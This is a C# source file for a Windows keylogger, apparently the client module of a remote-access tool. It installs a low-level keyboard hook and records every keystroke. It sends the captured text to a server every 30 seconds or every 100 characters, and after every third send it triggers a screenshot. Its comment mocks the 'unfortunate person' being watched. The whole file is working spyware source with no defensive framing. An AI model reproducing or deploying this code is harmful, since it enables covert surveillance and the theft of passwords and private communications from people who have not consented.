using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Armitage.Watchers
{
    /// <summary>
    /// Logs the unfortunate person's writings...<i>what have you been doing my love?</i>
    /// </summary>
    public static class Keylogger
    {
        #region Native Methods
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const uint WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
        /// <summary>
        /// Gets called every keystroke.
        /// </summary>
        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                string text = "";
                switch ((Keys)vkCode)
                {
                    case Keys.LControlKey:
                        text = "[lctrl]";
                        break;
                    case Keys.RControlKey:
                        text = "[rctrl]";
                        break;
                    case Keys.LShiftKey:
                        text = "[lshift]";
                        break;
                    case Keys.RShiftKey:
                        text = "[rshift]";
                        break;
                    case Keys.Alt:
                        text = "[alt]";
                        break;
                    case Keys.CapsLock:
                        if (wParam == (IntPtr)WM_KEYUP) text = "[caps: " + Control.IsKeyLocked(Keys.CapsLock) + "]";
                        else text = "[caps]";
                        break;
                    case Keys.Space:
                        text = "[space]";
                        break;
                    default:
                        if ((vkCode >= 49) && (vkCode <= 90))
                        {
                            text = ((Keys)vkCode).ToString();
                            if (text.Length == 2 && text.Contains("D"))
                            {
                                text = text[1].ToString();
                            }
                            if (!Control.IsKeyLocked(Keys.CapsLock))
                            {
                                text = text.ToLower();
                            }
                        }
                        else
                        {
                            text = "[" + ((Keys)vkCode).ToString() + "]";
                        }
                        break;
                }
                /// Mouse:
                if (wParam == (IntPtr)WM_KEYUP)
                {
                    text = "↑" + text;
                }
                else if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    text = "↓" + text;
                }

                text += " ";

                AddStroke(text);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static System.Timers.Timer _refreshtimer;
        public async static void Start()
        {
            _refreshtimer = new System.Timers.Timer();
            // Every 30 seconds, automatically send the logged strokes.
            _refreshtimer.Interval = 30 * 1000;
            _refreshtimer.Elapsed += _refreshtimer_Elapsed;
            _refreshtimer.Start();
            await Task.Run(() => {
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            });
        }

        private static void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SendStrokes();
        }

        /// <summary>
        /// The amount of keystrokes until the logger sends the data to the server.
        /// </summary>
        public static int MaxKeysPerSend = 100;

        /// <summary>
        /// Keystrokes are stored here.
        /// </summary>
        public static StringBuilder RawLogged = new StringBuilder();


        public static void AddStroke(string stroke)
        {
            RawLogged.Append(stroke);
            if (RawLogged.Length > MaxKeysPerSend)
            {
                SendStrokes();
                // reset the timer
                _refreshtimer.Stop();
                _refreshtimer.Start();
            }
        }
        private static int StrokesSend = 0;
        public async static void SendStrokes()
        {
            await Task.Run(() =>
            {  // Only send if there are logged strokes, obviously.
                if (RawLogged.Length >= 1)
                {
                    Communication.String_Stacker.Send(RawLogged.ToString(), Communication.String_Stacker.StringType.Keylog);
                    Debug.WriteLine($"Keylogger Sent: {RawLogged.Length}");
                    RawLogged.Clear();
                    StrokesSend++;
                    /// Send a screenshot every 3 keylogs sent.
                    if (StrokesSend > 2)
                    {
                        StrokesSend = 0;
                        // Tell Screenshotter to do a screenshot.
                        Screen_Watcher.SendOne();
                    }
                }
            });

        }

    }
}
